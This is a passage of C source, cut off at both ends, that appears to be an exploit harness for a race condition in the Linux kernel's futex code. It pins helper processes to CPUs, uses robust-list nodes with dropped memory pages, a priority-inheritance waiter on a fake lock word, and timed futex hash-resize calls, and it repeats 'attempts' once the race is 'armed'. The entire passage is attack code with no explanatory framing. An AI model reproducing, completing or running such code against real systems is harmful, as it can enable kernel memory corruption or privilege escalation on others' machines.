	return prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
}

#define PR_SET_NAME_LOCAL 15
#define PRIO_PROCESS_LOCAL 0
#define SYS_GETTID_X86_64 186
#define SYS_GETPRIORITY_X86_64 140
#define SYS_SCHED_GETSCHEDULER_X86_64 145
#define SYS_MADVISE_X86_64 28
#define SYS_RT_SIGPROCMASK_X86_64 14
#define SYS_SET_ROBUST_LIST_X86_64 273
#define RAW_SIG_SETMASK 2
#define KERNEL_SIGSET_BYTES 8UL
#define MADV_DONTNEED_LOCAL 4
#define FUTEX_LOCK_PI_PRIVATE_LOCAL (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define OWNER_CPU 1U
#define PI_WAITER_CPU 2U
#define OWNER_STOPPER_CPU 3U
#define ROBUST_NODES ROBUST_LIST_LIMIT
#define ROBUST_NODE_STRIDE (128U * 1024U)
#define PRIMARY_HASH_SLOTS 8U
#define CONTROL_HASH_SLOTS RESIZE_HASH_SLOTS
#define PR_FUTEX_HASH_GET_SLOTS_LOCAL 2
#define RESIZE_PUBLISH_DELAY_NS UINT64_C(5000000)
#define HASH_FOLD_WAIT_NS UINT64_C(250000000)
#define RESIZE_START_DELAY_NS UINT64_C(50000)
#define RESIZE_STOP_DELAY_NS UINT64_C(20000)
#define PI_RESERVOIR_AIO_MIN_COMPLETED UINT64_C(20001)
#define PI_RESERVOIR_AIO_MAX_COMPLETED UINT64_C(46000)
#define OWNER_STOPPER_WAIT_NS UINT64_C(1000000000)
#define PI_RESERVOIR_AIO_STALL_NS PI_RESERVOIR_AIO_STALL_THRESHOLD_NS
#define RESIZE_HOG_CPU_COUNT 3U

struct robust_node_local {
	struct robust_list list;
	uint32_t futex;
	uint8_t padding[ROBUST_NODE_STRIDE - sizeof(struct robust_list) -
			sizeof(uint32_t)];
};

_Static_assert(sizeof(struct robust_node_local) == ROBUST_NODE_STRIDE,
	       "robust nodes must have the intended sparse fault stride");

struct pi_reservoir_shared {
	int owner_ready;
	int owner_exit_go;
	int owner_hog_ready;
	int owner_hog_waiting;
	int owner_hog_go;
	int owner_hog_active;
	int owner_hog_release;
	int owner_hog_done;
	int owner_hog_ret;
	int owner_hog_policy;
	int owner_hog_nice;
	int owner_hog_wake_ret;
	int owner_hog_runnable;
	int owner_hog_post_ref;
	int owner_hog_active_post_ref;
	int pi_waiter_ready;
	int pi_waiter_go;
	int pi_waiter_entered;
	int pi_waiter_done;
	int pi_waiter_affinity_rc;
	int pi_waiter_node_seen;
	int pi_waiter_attach_go;
	int owner_node_wait_ret;
	int owner_node_selfwake;
	int owner_nodes_drop_ret;
	int owner_nodes_dropped;
	int owner_nodes_validated;
	int owner_policy;
	int controller_move_rc;
	int controller_policy_observed;
	int owner_tail_pending;
	int pi_waiter_ref_before_hog;
	int pi_waiter_ref_before_resize_release;
	int resize_release_after_hog_active;
	int resize_publish_before_owner_release;
	int resize_hog_ready[RESIZE_HOG_CPU_COUNT];
	int resize_hog_go[RESIZE_HOG_CPU_COUNT];
	int resize_hog_waiting[RESIZE_HOG_CPU_COUNT];
	int resize_hog_pid;
	int resize_release_move_rc;
	int resize_release_move_done;
	int resize_pid;
	int resize_call_ready;
	int resize_stopper_done;
	int resize_stopper_to_cpu2_rc;
	int resize_stopper_to_cpu0_rc;
	int resize_cpu;
	int resize_hog_index;

	int resize_return_park;
	int owner_pid;
	int owner_hog_pid;
	int pi_waiter_pid;
	long pi_waiter_ret;
	uint64_t resize_stopper_ns;
	uint64_t resize_release_move_ns;
	uint64_t owner_node_wait_ns;
	uint64_t owner_node_seen_ns;
	uint64_t pi_waiter_ref_ns;
	uint64_t owner_hog_wake_ns;
	uint64_t owner_hog_active_ns;
	uint32_t fake_pi_word;
	uint32_t reserved;
	struct robust_list_head robust_head;
	_Alignas(4096) struct robust_node_local nodes[ROBUST_NODES];
};

_Static_assert(offsetof(struct pi_reservoir_shared, nodes) % 4096 == 0,
	       "robust node array must start at a page boundary");

static struct pi_reservoir_shared *pi_shared;
static uint64_t aio_sequence;
static const unsigned int resize_hog_cpus[RESIZE_HOG_CPU_COUNT] = { 0U, 2U,
								    3U };

long raw_clone3_pi_waiter(const struct clone_args_local *args, size_t size);
void pi_waiter_entry(void) __attribute__((noreturn, noinline, used));

static void resize_hog_main(unsigned int index)
{
	static const char comm[] = "resize-hog";
	struct timespec wake_time;
	uint64_t deadline;
	long ret;

	(void)prctl(PR_SET_NAME, comm, 0, 0, 0);
	if (index >= RESIZE_HOG_CPU_COUNT ||
	    pin_cpu(resize_hog_cpus[index]) != 0)
		_exit(70);
	__atomic_store_n(&pi_shared->resize_hog_pid, (int)getpid(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->resize_hog_ready[index], 1,
			 __ATOMIC_RELEASE);
	while (!__atomic_load_n(&pi_shared->resize_hog_go[index],
				__ATOMIC_ACQUIRE)) {
		ret = syscall(SYS_FUTEX_X86_64,
			      &pi_shared->resize_hog_go[index], FUTEX_WAIT, 0,
			      NULL, NULL, 0);
		if (ret < 0 && errno != EAGAIN && errno != EINTR)
			_exit(71);
	}

	__atomic_store_n(&pi_shared->resize_hog_waiting[index], 1,
			 __ATOMIC_RELEASE);
	while (!__atomic_load_n(&controller->resize_go, __ATOMIC_ACQUIRE))
		__asm__ volatile("pause");
	deadline = monotonic_ns() + controller->delay_ns;
	wake_time.tv_sec = (time_t)(deadline / UINT64_C(1000000000));
	wake_time.tv_nsec = (long)(deadline % UINT64_C(1000000000));
	for (;;) {
		int sleep_ret = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME,
						&wake_time, NULL);

		if (sleep_ret == 0)
			break;
		if (sleep_ret != EINTR)
			_exit(71);
	}
	__atomic_store_n(&controller->hog_ns, monotonic_ns(), __ATOMIC_RELEASE);
	__atomic_store_n(&controller->hog_active, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&controller->release_resize, __ATOMIC_ACQUIRE))
		__asm__ volatile("pause");
	__atomic_store_n(&controller->hog_done, 1, __ATOMIC_RELEASE);
	_exit(0);
}

__asm__(".text\n"
	".p2align 4\n"
	".globl raw_clone3_pi_waiter\n"
	".type raw_clone3_pi_waiter,@function\n"
	"raw_clone3_pi_waiter:\n"
	"mov $435, %eax\n"
	"syscall\n"
	"test %rax, %rax\n"
	"jnz 1f\n"
	"xor %ebp, %ebp\n"
	"call pi_waiter_entry\n"
	"ud2\n"
	"1: ret\n"
	".size raw_clone3_pi_waiter, .-raw_clone3_pi_waiter\n");

void hash_resize_entry(void)
{
	static const char comm[] = "pi-resize";
	struct {
		int sched_priority;
	} param = { 0 };
	const int resize_pid = (int)raw_syscall0(SYS_GETPID_X86_64);
	const int vfork_bridge_pid =
		__atomic_load_n(&state.vfork_bridge_pid, __ATOMIC_ACQUIRE);
	long ret;

	(void)raw_syscall5(SYS_PRCTL_X86_64, PR_SET_NAME_LOCAL,
			   (long)(uintptr_t)comm, 0, 0, 0);
	__atomic_store_n(&state.resize_pid, resize_pid, __ATOMIC_RELEASE);
	if (vfork_bridge_pid <= 1 || vfork_bridge_pid == resize_pid)
		raw_exit(20);
	ret = raw_syscall2(SYS_KILL_X86_64, vfork_bridge_pid, SIGKILL);
	if (ret < 0)
		raw_exit(21);

	ret = raw_syscall3(SYS_SCHED_SETSCHEDULER_X86_64, 0, SCHED_IDLE,
			   (long)(uintptr_t)&param);
	__atomic_store_n(&state.resize_sched_rc, (int)ret, __ATOMIC_RELEASE);
	__atomic_store_n(&state.resize_ready, 1, __ATOMIC_RELEASE);
	if (ret < 0)
		raw_exit(22);

	while (!__atomic_load_n(&controller->resize_go, __ATOMIC_ACQUIRE)) {
		long wait_ret =
			raw_syscall6(SYS_FUTEX_X86_64,
				     (long)(uintptr_t)&controller->resize_go,
				     FUTEX_WAIT, 0, 0, 0, 0);

		if (wait_ret < 0 && wait_ret != -EAGAIN && wait_ret != -EINTR)
			raw_exit(22);
	}
	if (__atomic_load_n(&state.resize_affinity_rc, __ATOMIC_ACQUIRE) != 0)
		raw_exit(22);

	__atomic_store_n(&state.resize_enter_ns, raw_monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&controller->gate_sent, 1, __ATOMIC_RELEASE);

	__atomic_store_n(&pi_shared->resize_call_ready, 1, __ATOMIC_RELEASE);
	ret = raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
			   PR_FUTEX_HASH_SET_SLOTS_LOCAL, RESIZE_HASH_SLOTS, 0,
			   0);
	__atomic_store_n(&state.resize_exit_ns, raw_monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&state.resize_prctl_ret, ret, __ATOMIC_RELEASE);

	for (;;)
		(void)raw_syscall6(
			SYS_FUTEX_X86_64,
			(long)(uintptr_t)&pi_shared->resize_return_park,
			FUTEX_WAIT, 0, 0, 0, 0);
}

void pi_waiter_entry(void)
{
	static const char comm[] = "pi-waiter";
	long ret;

	(void)raw_syscall5(SYS_PRCTL_X86_64, PR_SET_NAME_LOCAL,
			   (long)(uintptr_t)comm, 0, 0, 0);
	__atomic_store_n(&pi_shared->pi_waiter_pid,
			 (int)raw_syscall0(SYS_GETPID_X86_64),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->pi_waiter_affinity_rc,
			 raw_pin_cpu(PI_WAITER_CPU), __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->pi_waiter_ready, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&pi_shared->pi_waiter_go, __ATOMIC_ACQUIRE))
		(void)raw_syscall0(SYS_SCHED_YIELD_X86_64);
	while (__atomic_load_n(&pi_shared->nodes[0].futex, __ATOMIC_ACQUIRE) !=
	       (FUTEX_WAITERS | FUTEX_OWNER_DIED))
		__asm__ volatile("pause");

	__atomic_store_n(&pi_shared->pi_waiter_node_seen, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&pi_shared->pi_waiter_attach_go,
				__ATOMIC_ACQUIRE))
		__asm__ volatile("pause");

	__atomic_store_n(&pi_shared->pi_waiter_entered, 1, __ATOMIC_RELEASE);
	ret = raw_syscall6(SYS_FUTEX_X86_64,
			   (long)(uintptr_t)&pi_shared->fake_pi_word,
			   FUTEX_LOCK_PI_PRIVATE_LOCAL, 0, 0, 0, 0);
	__atomic_store_n(&pi_shared->pi_waiter_ret, ret, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->pi_waiter_done, 1, __ATOMIC_RELEASE);
	raw_exit(ret == -ESRCH ? 0 : 31);
}

static int block_all_catchable_signals(void)
{
	const uint64_t wanted = UINT64_MAX & ~(UINT64_C(1) << (SIGKILL - 1)) &
				~(UINT64_C(1) << (SIGSTOP - 1));
	uint64_t observed = 0;

	if (raw_syscall5(SYS_RT_SIGPROCMASK_X86_64, RAW_SIG_SETMASK,
			 (long)(uintptr_t)&wanted, 0, KERNEL_SIGSET_BYTES,
			 0) != 0 ||
	    raw_syscall5(SYS_RT_SIGPROCMASK_X86_64, RAW_SIG_SETMASK, 0,
			 (long)(uintptr_t)&observed, KERNEL_SIGSET_BYTES,
			 0) != 0)
		return -1;
	return observed == wanted ? 0 : -1;
}

static void convoy_controller_main(void)
{
	static const char comm[] = "resize-convoy";
	cpu_set_t resize_cpu_set;
	uint64_t deadline;
	long wait_ret;
	int to_cpu2_rc = -ETIMEDOUT;
	int to_cpu0_rc = -ETIMEDOUT;

	(void)prctl(PR_SET_NAME, comm, 0, 0, 0);
	if (pin_cpu(2) != 0)
		_exit(60);
	__atomic_store_n(&controller->ready, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&controller->hog_request, __ATOMIC_ACQUIRE)) {
		wait_ret = syscall(SYS_FUTEX_X86_64, &controller->hog_request,
				   FUTEX_WAIT, 0, NULL, NULL, 0);
		if (wait_ret < 0 && errno != EAGAIN && errno != EINTR)
			_exit(61);
	}

	deadline = __atomic_load_n(&controller->gate_ns, __ATOMIC_ACQUIRE) +
		   RESIZE_START_DELAY_NS;
	while (monotonic_ns() < deadline)
		__asm__ volatile("pause");
	__atomic_store_n(&controller->resize_go_ns, monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&controller->resize_go, 1, __ATOMIC_RELEASE);
	(void)syscall(SYS_FUTEX_X86_64, &controller->resize_go, FUTEX_WAKE, 1,
		      NULL, NULL, 0);

	deadline = monotonic_ns() + UINT64_C(100000000);
	while (!__atomic_load_n(&pi_shared->resize_call_ready,
				__ATOMIC_ACQUIRE) &&
	       monotonic_ns() < deadline)
		__asm__ volatile("pause");
	if (__atomic_load_n(&pi_shared->resize_call_ready, __ATOMIC_ACQUIRE)) {
		deadline = monotonic_ns() + RESIZE_STOP_DELAY_NS;
		while (monotonic_ns() < deadline)
			__asm__ volatile("pause");
		CPU_ZERO(&resize_cpu_set);
		CPU_SET(2, &resize_cpu_set);
		to_cpu2_rc = sched_setaffinity(pi_shared->resize_pid,
					       sizeof(resize_cpu_set),
					       &resize_cpu_set) == 0 ?
				     0 :
				     -errno;
		if (to_cpu2_rc == 0) {
			CPU_ZERO(&resize_cpu_set);
			CPU_SET(0, &resize_cpu_set);
			to_cpu0_rc = sched_setaffinity(pi_shared->resize_pid,
						       sizeof(resize_cpu_set),
						       &resize_cpu_set) == 0 ?
					     0 :
					     -errno;
		}
	}
	__atomic_store_n(&pi_shared->resize_stopper_to_cpu2_rc, to_cpu2_rc,
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->resize_stopper_to_cpu0_rc, to_cpu0_rc,
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->resize_stopper_ns, monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->resize_stopper_done, 1, __ATOMIC_RELEASE);
	_exit(0);
}

static void owner_main(void)
{
	struct {
		int sched_priority;
	} param = { 0 };
	const int tid = (int)raw_syscall0(SYS_GETTID_X86_64);
	static const char comm[] = "pi-owner";

	(void)raw_syscall5(SYS_PRCTL_X86_64, PR_SET_NAME_LOCAL,
			   (long)(uintptr_t)comm, 0, 0, 0);
	if (raw_pin_cpu(OWNER_CPU) < 0)
		raw_exit(40);

	pi_shared->robust_head.list.next = &pi_shared->nodes[0].list;
	pi_shared->robust_head.futex_offset =
		(long)offsetof(struct robust_node_local, futex);
	pi_shared->robust_head.list_op_pending = NULL;
	for (size_t i = 0; i < ROBUST_NODES; ++i) {
		pi_shared->nodes[i].list.next =
			i + 1 < ROBUST_NODES ? &pi_shared->nodes[i + 1].list :
					       &pi_shared->robust_head.list;
		__atomic_store_n(&pi_shared->nodes[i].futex,
				 (uint32_t)tid | FUTEX_WAITERS,
				 __ATOMIC_RELEASE);
	}
	__atomic_store_n(&pi_shared->owner_pid, tid, __ATOMIC_RELEASE);
	if (raw_syscall2(SYS_SET_ROBUST_LIST_X86_64,
			 (long)(uintptr_t)&pi_shared->robust_head,
			 sizeof(pi_shared->robust_head)) < 0)
		raw_exit(41);

	__atomic_store_n(&pi_shared->owner_nodes_drop_ret,
			 (int)raw_syscall3(
				 SYS_MADVISE_X86_64,
				 (long)(uintptr_t)&pi_shared->nodes[0],
				 sizeof(pi_shared->nodes), MADV_DONTNEED_LOCAL),
			 __ATOMIC_RELEASE);
	if (__atomic_load_n(&pi_shared->owner_nodes_drop_ret,
			    __ATOMIC_ACQUIRE) != 0)
		raw_exit(42);

	if (raw_syscall3(SYS_SCHED_SETSCHEDULER_X86_64, 0, SCHED_IDLE,
			 (long)(uintptr_t)&param) < 0)
		raw_exit(43);
	__atomic_store_n(&pi_shared->owner_policy,
			 (int)raw_syscall1(SYS_SCHED_GETSCHEDULER_X86_64, 0),
			 __ATOMIC_RELEASE);
	if (__atomic_load_n(&pi_shared->owner_policy, __ATOMIC_ACQUIRE) !=
	    SCHED_IDLE)
		raw_exit(44);
	__atomic_store_n(&pi_shared->owner_nodes_dropped, 1, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_ready, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&pi_shared->owner_exit_go, __ATOMIC_ACQUIRE)) {
		long wait_ret =
			raw_syscall6(SYS_FUTEX_X86_64,
				     (long)(uintptr_t)&pi_shared->owner_exit_go,
				     FUTEX_WAIT, 0, 0, 0, 0);

		if (wait_ret < 0 && wait_ret != -EAGAIN && wait_ret != -EINTR)
			raw_exit(45);
	}
	raw_exit(0);
}

static void owner_hog_main(void)
{
	struct {
		int sched_priority;
	} param = { 0 };
	static const char comm[] = "owner-hog";
	long kernel_priority;
	long policy;
	long ret;

	(void)raw_syscall5(SYS_PRCTL_X86_64, PR_SET_NAME_LOCAL,
			   (long)(uintptr_t)comm, 0, 0, 0);
	if (raw_syscall3(SYS_SCHED_SETSCHEDULER_X86_64, 0, SCHED_OTHER,
			 (long)(uintptr_t)&param) < 0)
		raw_exit(50);
	policy = raw_syscall1(SYS_SCHED_GETSCHEDULER_X86_64, 0);
	__atomic_store_n(&pi_shared->owner_hog_policy, (int)policy,
			 __ATOMIC_RELEASE);
	kernel_priority =
		raw_syscall2(SYS_GETPRIORITY_X86_64, PRIO_PROCESS_LOCAL, 0);
	__atomic_store_n(&pi_shared->owner_hog_nice,
			 kernel_priority > 0 ? 20 - (int)kernel_priority :
					       INT_MIN,
			 __ATOMIC_RELEASE);
	if (policy != SCHED_OTHER || kernel_priority != 20 ||
	    raw_pin_cpu(OWNER_CPU) < 0)
		raw_exit(51);
	while (!__atomic_load_n(&pi_shared->owner_ready, __ATOMIC_ACQUIRE))
		(void)raw_syscall0(SYS_SCHED_YIELD_X86_64);
	__atomic_store_n(&pi_shared->owner_hog_pid,
			 (int)raw_syscall0(SYS_GETTID_X86_64),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_ready, 1, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_waiting, 1, __ATOMIC_RELEASE);

	ret = raw_syscall6(SYS_FUTEX_X86_64,
			   (long)(uintptr_t)&pi_shared->owner_hog_go,
			   FUTEX_WAIT, 0, 0, 0, 0);
	__atomic_store_n(&pi_shared->owner_hog_ret, (int)ret, __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_active_ns, raw_monotonic_ns(),
			 __ATOMIC_RELEASE);
	__atomic_store_n(&pi_shared->owner_hog_active, 1, __ATOMIC_RELEASE);
	while (!__atomic_load_n(&pi_shared->owner_hog_release,
				__ATOMIC_ACQUIRE))
		__asm__ volatile("pause");
	__atomic_store_n(&pi_shared->owner_hog_done, 1, __ATOMIC_RELEASE);
	raw_exit(ret == 0 ? 0 : 52);
}

static int wait_for_aio_stage(unsigned int timeout_ms)
{
	uint64_t deadline = monotonic_ns() + (uint64_t)timeout_ms * 1000000U;
	uint64_t claimed;

	while (monotonic_ns() < deadline) {
		uint64_t phase = __atomic_load_n(&aio_heartbeat->phase,
						 __ATOMIC_ACQUIRE);
		uint64_t active = __atomic_load_n(&aio_heartbeat->active_seq,
						  __ATOMIC_ACQUIRE);
		uint64_t enter = __atomic_load_n(&aio_heartbeat->enter_ns,
						 __ATOMIC_RELAXED);
		uint64_t now = monotonic_ns();
		uint64_t expected_phase = PI_RESERVOIR_AIO_PHASE_ARMED_SETUP;

		if (phase != PI_RESERVOIR_AIO_PHASE_ARMED_SETUP ||
		    active < PI_RESERVOIR_AIO_MIN_COMPLETED ||
		    active > PI_RESERVOIR_AIO_MAX_COMPLETED || !enter ||
		    now - enter < PI_RESERVOIR_AIO_STALL_NS ||
		    __atomic_load_n(&aio_heartbeat->active_seq,
				    __ATOMIC_ACQUIRE) != active) {
			if (__atomic_load_n(&aio_heartbeat->done,
					    __ATOMIC_ACQUIRE))
				return -1;
			__asm__ volatile("pause");
			continue;
		}
		if (!__atomic_compare_exchange_n(
			    &aio_heartbeat->phase, &expected_phase,
			    PI_RESERVOIR_AIO_PHASE_STOPPING, false,
			    __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE))
			continue;
		claimed = __atomic_load_n(&aio_heartbeat->active_seq,
					  __ATOMIC_ACQUIRE);
		__atomic_store_n(&aio_heartbeat->stop_requested, 1,
				 __ATOMIC_RELEASE);
		if (claimed != active)
			return -1;
		pi_shared->resize_cpu = 0;
		pi_shared->resize_hog_index = 0;
		aio_sequence = active;
		return 0;
	}
	return -1;
}

static int wait_uint64_nonzero(const uint64_t *value, uint64_t timeout_ns)
{
	uint64_t deadline = monotonic_ns() + timeout_ns;

	while (__atomic_load_n(value, __ATOMIC_ACQUIRE) == 0) {
		if (monotonic_ns() >= deadline)
			return -1;
		sched_yield();
	}
	return 0;
}

static int wait_int_busy(const int *value, int wanted, uint64_t timeout_ns)
{
	uint64_t deadline = monotonic_ns() + timeout_ns;

	while (__atomic_load_n(value, __ATOMIC_ACQUIRE) != wanted) {
		if (monotonic_ns() >= deadline)
			return -ETIMEDOUT;
		__asm__ volatile("pause");
	}
	return 0;
}

static int wait_uint32_busy(const uint32_t *value, uint32_t wanted,
			    uint64_t timeout_ns)
{
	uint64_t deadline = monotonic_ns() + timeout_ns;

	while (__atomic_load_n(value, __ATOMIC_ACQUIRE) != wanted) {
		if (monotonic_ns() >= deadline)
			return -ETIMEDOUT;
		__asm__ volatile("pause");
	}
	return 0;
}

static int move_pid_to_cpu(pid_t pid, unsigned int cpu)
{
	cpu_set_t set;

	if (pid <= 1)
		return -ESRCH;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(pid, sizeof(set), &set) == 0)
		return 0;
	return -errno;
}

static int verify_hash_resize_control(void)
{
	pid_t child;
	int status = 0;

	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		long initial_slots;
		long set_initial_slots_rc;
		long configured_initial_slots;
		long set_expanded_slots_rc;
		long configured_expanded_slots;
		int ok;

		(void)prctl(PR_SET_NAME, "hash-control", 0, 0, 0);
		initial_slots =
			raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				     PR_FUTEX_HASH_GET_SLOTS_LOCAL, 0, 0, 0);
		set_initial_slots_rc =
			raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				     PR_FUTEX_HASH_SET_SLOTS_LOCAL,
				     PRIMARY_HASH_SLOTS, 0, 0);
		configured_initial_slots =
			raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				     PR_FUTEX_HASH_GET_SLOTS_LOCAL, 0, 0, 0);
		set_expanded_slots_rc =
			raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				     PR_FUTEX_HASH_SET_SLOTS_LOCAL,
				     CONTROL_HASH_SLOTS, 0, 0);
		configured_expanded_slots =
			raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
				     PR_FUTEX_HASH_GET_SLOTS_LOCAL, 0, 0, 0);
		ok = initial_slots == 0 && set_initial_slots_rc == 0 &&
		     configured_initial_slots == PRIMARY_HASH_SLOTS &&
		     set_expanded_slots_rc == 0 &&
		     configured_expanded_slots == CONTROL_HASH_SLOTS;
		raw_exit(ok ? 0 : 80);
	}
	if (waitpid(child, &status, 0) != child || !WIFEXITED(status) ||
	    WEXITSTATUS(status) != 0)
		return -1;
	return 0;
}

static int pi_reservoir_attempt(uint64_t resize_lag_ns,
				unsigned int gate_wait_ms)
{
	struct guarded_stack vfork_bridge_stack = allocate_stack(STACK_SIZE);
	struct guarded_stack hash_resize_stack_area =
		allocate_stack(STACK_SIZE);
	struct guarded_stack pi_waiter_stack = allocate_stack(STACK_SIZE);
	struct clone_args_local args = { 0 };
	uint64_t resize_publish_wait_start_ns;
	uint64_t pi_waiters_seen_ns = 0;
	pid_t helper = -1, owner = -1, owner_hog = -1;
	pid_t resize_hog_pids[RESIZE_HOG_CPU_COUNT] = { -1, -1 };
	pid_t pi_waiter_pid = -1;
	struct {
		int sched_priority;
	} controller_sched_param = { 0 };
	long controller_policy;
	long vfork_bridge_pid;
	int status = 0;
	long final_slots = LONG_MIN;
	int result = ATTEMPT_ERROR;
	int race_armed = 0;

	if (prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0) != 0 ||
	    prctl(PR_SET_TIMERSLACK, 1, 0, 0, 0) != 0 ||
	    prctl(PR_SET_NAME, "pi-controller", 0, 0, 0) != 0)
		goto out;
	memset(&state, 0, sizeof(state));
	state.resize_prctl_ret = LONG_MIN;
	state.resize_sched_rc = INT_MIN;
	state.resize_affinity_rc = INT_MIN;
	memset(controller, 0, sizeof(*controller));

	memset(pi_shared, 0, offsetof(struct pi_reservoir_shared, nodes));
	pi_shared->pi_waiter_ret = LONG_MIN;
	pi_shared->pi_waiter_affinity_rc = INT_MIN;
	pi_shared->owner_hog_ret = INT_MIN;
	pi_shared->owner_hog_policy = INT_MIN;
	pi_shared->owner_hog_nice = INT_MIN;
	pi_shared->owner_hog_wake_ret = INT_MIN;
	pi_shared->owner_node_wait_ret = INT_MIN;
	pi_shared->owner_nodes_drop_ret = INT_MIN;
	pi_shared->owner_policy = INT_MIN;
	pi_shared->controller_move_rc = INT_MIN;
	pi_shared->controller_policy_observed = INT_MIN;
	pi_shared->resize_cpu = -1;
	pi_shared->resize_hog_index = -1;
	controller->delay_ns = resize_lag_ns;
	if (!vfork_bridge_stack.usable || !hash_resize_stack_area.usable ||
	    !pi_waiter_stack.usable || pin_cpu(1) != 0)
		goto out;

	owner = fork();
	if (owner < 0)
		goto out;
	if (owner == 0)
		owner_main();

	if (wait_value(&pi_shared->owner_ready, 1, UINT64_C(1000000000)) != 0 ||
	    pi_shared->owner_nodes_drop_ret != 0 ||
	    __atomic_load_n(&pi_shared->owner_nodes_dropped,
			    __ATOMIC_ACQUIRE) != 1 ||
	    pi_shared->owner_policy != SCHED_IDLE)
		goto out;
	owner_hog = fork();
	if (owner_hog < 0)
		goto out;
	if (owner_hog == 0)
		owner_hog_main();
	if (wait_value(&pi_shared->owner_hog_waiting, 1,
		       UINT64_C(1000000000)) != 0 ||
	    pi_shared->owner_hog_policy != SCHED_OTHER)
		goto out;
	if (pi_shared->owner_hog_nice != 0)
		goto out;

	for (size_t i = 0; i < ROBUST_NODES; ++i) {
		struct robust_list *expected_next =
			i + 1 < ROBUST_NODES ? &pi_shared->nodes[i + 1].list :
					       &pi_shared->robust_head.list;

		if (__atomic_load_n(&pi_shared->nodes[i].list.next,
				    __ATOMIC_ACQUIRE) != expected_next ||
		    __atomic_load_n(&pi_shared->nodes[i].futex,
				    __ATOMIC_ACQUIRE) !=
			    ((uint32_t)pi_shared->owner_pid | FUTEX_WAITERS))
			goto out;
	}
	__atomic_store_n(&pi_shared->owner_nodes_validated, 1,
			 __ATOMIC_RELEASE);

	usleep(10000);

	resize_hog_pids[0] = fork();
	if (resize_hog_pids[0] < 0)
		goto out;
	if (resize_hog_pids[0] == 0)
		resize_hog_main(0);
	helper = fork();
	if (helper < 0)
		goto out;
	if (helper == 0)
		convoy_controller_main();
	if (wait_value(&controller->ready, 1, UINT64_C(1000000000)) != 0)
		goto out;
	if (wait_value(&pi_shared->resize_hog_ready[0], 1,
		       UINT64_C(1000000000)) != 0)
		goto out;

	hash_resize_stack = hash_resize_stack_area.usable;
	args.flags = CLONE_VM_LOCAL | CLONE_VFORK_LOCAL;
	args.exit_signal = SIGCHLD;
	args.stack = (uint64_t)(uintptr_t)vfork_bridge_stack.usable;
	args.stack_size = STACK_SIZE;
	vfork_bridge_pid = raw_clone3_vfork_bridge(&args, sizeof(args));
	if (vfork_bridge_pid < 0 ||
	    waitpid((pid_t)vfork_bridge_pid, &status, 0) != vfork_bridge_pid ||
	    !WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL ||
	    wait_value(&state.resize_ready, 1, UINT64_C(1000000000)) != 0 ||
	    __atomic_load_n(&state.resize_sched_rc, __ATOMIC_ACQUIRE) != 0)
		goto out;
	__atomic_store_n(&pi_shared->resize_pid, state.resize_pid,
			 __ATOMIC_RELEASE);

	if (wait_for_aio_stage(gate_wait_ms) != 0)
		goto out;

	race_armed = 1;
	if (pi_shared->resize_hog_index < 0 ||
	    pi_shared->resize_hog_index >= (int)RESIZE_HOG_CPU_COUNT)
		goto out;
	{
		cpu_set_t resize_cpu_set;
		int hog_index = pi_shared->resize_hog_index;

		CPU_ZERO(&resize_cpu_set);
		CPU_SET((unsigned int)pi_shared->resize_cpu, &resize_cpu_set);
		if (sched_setaffinity(state.resize_pid, sizeof(resize_cpu_set),
				      &resize_cpu_set) != 0)
			goto out;
		__atomic_store_n(&state.resize_affinity_rc, 0,
				 __ATOMIC_RELEASE);
		__atomic_store_n(&pi_shared->resize_hog_go[hog_index], 1,
				 __ATOMIC_RELEASE);
		(void)syscall(SYS_FUTEX_X86_64,
			      &pi_shared->resize_hog_go[hog_index], FUTEX_WAKE,
			      1, NULL, NULL, 0);
		if (wait_value(&pi_shared->resize_hog_waiting[hog_index], 1,
			       UINT64_C(100000000)) != 0)
			goto out;

		__atomic_store_n(&controller->gate_ns, monotonic_ns(),
				 __ATOMIC_RELEASE);
		__atomic_store_n(&controller->hog_request, 1, __ATOMIC_RELEASE);
		(void)syscall(SYS_FUTEX_X86_64, &controller->hog_request,
			      FUTEX_WAKE, 1, NULL, NULL, 0);
	}
	if (raw_syscall5(SYS_PRCTL_X86_64, PR_FUTEX_HASH_LOCAL,
			 PR_FUTEX_HASH_SET_SLOTS_LOCAL, PRIMARY_HASH_SLOTS, 0,
			 0) < 0)
		goto out;
	if (wait_value(&controller->gate_sent, 1, UINT64_C(100000000)) != 0 ||
	    wait_value(&controller->hog_active, 1, UINT64_C(100000000)) != 0 ||
	    wait_value(&pi_shared->resize_stopper_done, 1,
